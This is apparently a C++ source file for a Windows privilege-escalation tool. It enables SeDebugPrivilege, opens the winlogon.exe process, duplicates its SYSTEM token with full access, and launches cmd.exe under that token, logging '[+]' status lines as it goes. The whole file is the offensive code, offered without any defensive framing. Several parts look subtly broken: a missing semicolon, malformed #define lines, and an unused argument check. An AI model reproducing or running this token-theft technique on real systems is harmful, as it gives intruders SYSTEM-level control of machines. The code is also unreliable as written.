#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

#include "nt-system.h"

DWORD getPID(std::wstring name)

enum LogonFlags { WithProfile = 1, NetCredentialsOnly }; 

enum CreationFlags
{
	DefaultErrorMode = 0x04000000,
	NewConsole = 0x00000010,
	NewProcessGroup = 0x00000200,
	SeparateWOWVDM = 0x00000800,
	Suspended = 0x00000004,
	UnicodeEnvironment = 0x00000400,
	ExtendedStartupInfoPresent = 0x00080000
}; 
/*
#ifndef LUID

struct _LUID {
	DWORD LowPart;
	LONG  HighPart;
} LUID, * PLUID;

#endif
*/
#ifndef TOKEN_QUERY 
 #define STANDARD_RIGHTS_REQUIRED = 0x000F0000
 #define STANDARD_RIGHTS_READ = 0x00020000
 #define TOKEN_ASSIGN_PRIMARY = 0x0001
 #define TOKEN_DUPLICATE = 0x0002
 #define TOKEN_IMPERSONATE = 0x0004
 #define TOKEN_QUERY = 0x0008
 #define TOKEN_QUERY_SOURCE = 0x0010
 #define TOKEN_ADJUST_PRIVILEGES = 0x0020
 #define TOKEN_ADJUST_GROUPS = 0x0040
 #define TOKEN_ADJUST_DEFAULT = 0x0080
 #define TOKEN_ADJUST_SESSIONID = 0x0100
 #define TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY) 
 #define TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | \
	 TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |\
	 TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |\
	 TOKEN_ADJUST_SESSIONID)
#endif

using namespace std; 



int wmain(int argc, wchar_t** argv)
{
	BOOL is_winlogon = FALSE; 

	if (argc != 2) {
		puts("[+]using by default winlogon.exe");
		is_winlogon = TRUE;
	}
	/* Enabling SeDebugpriv in case its not enabled */

	const WCHAR*  Privilege = L"SeDebugPrivilege";
	
	HANDLE token; 
	PHANDLE hToken = &token; 
	LUID luid;
	TOKEN_PRIVILEGES TP;
	LUID_AND_ATTRIBUTES lu_attr ;
	DWORD trash; 
	
	HANDLE hCurrentproc = OpenProcess(PROCESS_QUERY_INFORMATION, false, GetCurrentProcessId());
	if (hCurrentproc == INVALID_HANDLE_VALUE)
	{
		puts("[-] Couldn't open handle to current process\n");
		exit(1); 
	}

	if (!OpenProcessToken(hCurrentproc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,hToken))
	{
		
		puts("[-] error retrieving token for the current process\n"); 
		exit(1); 
	}
	if (! LookupPrivilegeValue(NULL, Privilege, &luid)) 
	{
		puts("[-]couldnt get a handle to privilege struct\n"); 
		exit(1); 
	}
	/* Saving old state */
	TOKEN_PRIVILEGES old_state = TOKEN_PRIVILEGES(); 

	lu_attr.Luid = luid; 
	lu_attr.Attributes = SE_PRIVILEGE_ENABLED;
	TP.PrivilegeCount = 1;
	TP.Privileges[0] = lu_attr; 

	if (!AdjustTokenPrivileges(token, false, &TP, (unsigned __int32)sizeof(TP), &old_state, &trash)) {
		printf("%d", GetLastError());
		puts("[-] can't adjust token for debug priveleges "); 
		exit(1); 
	}
	puts("[+] SeDebugPrivilege set up correctly!"); 
	Sleep(500);
	/* duplicating the token */

	HANDLE target = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, getPID(L"winlogon.exe") ); 
	SECURITY_IMPERSONATION_LEVEL seImpLv = SecurityImpersonation; 
	TOKEN_TYPE tkentype = TokenPrimary; 
	SECURITY_ATTRIBUTES sec_att = SECURITY_ATTRIBUTES(); 
	HANDLE newtoken; 

	if (target == INVALID_HANDLE_VALUE)
	{
		puts("[-] Couldn't open handle to target process");
		exit(1);
	}

	if (!OpenProcessToken(target, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, hToken))
	{

		puts("[-] error retrieving token for the target process");
		exit(1);
	}
	puts("[+] system process token retrieved"); 
	Sleep(500);
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, &sec_att, seImpLv, tkentype, &newtoken))
	{
		printf("%d", GetLastError()); 
		puts("[+] unable to duplicate token "); 
		exit(1); 
	}
	puts("[+] Token duplicated successfully"); 
	Sleep(500);
	/* Creating the new process and getting NT AUTHORITY privilege */
	STARTUPINFO SI = STARTUPINFO(); 
	PROCESS_INFORMATION PI; 

	if (!CreateProcessWithTokenW(newtoken, NetCredentialsOnly, L"C:\\Windows\\System32\\cmd.exe", NULL, NewConsole, 0, NULL, &SI, &PI)) 
	{

		puts("[+] unable to create process \n");
		exit(1);
	}
	Sleep(500);
	puts("[+] process Created success !"); 
	WaitForSingleObject(PI.hProcess,INFINITE); 
}


DWORD getPID(std::wstring name) // Get pid by name of process 
{
	DWORD PID = -1;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			std::wstring binaryPath = entry.szExeFile;
			if (binaryPath.find(name) != std::wstring::npos)
			{
				PID = entry.th32ProcessID;

				break;
			}
		}
	}

	CloseHandle(snapshot);
	return PID;
}
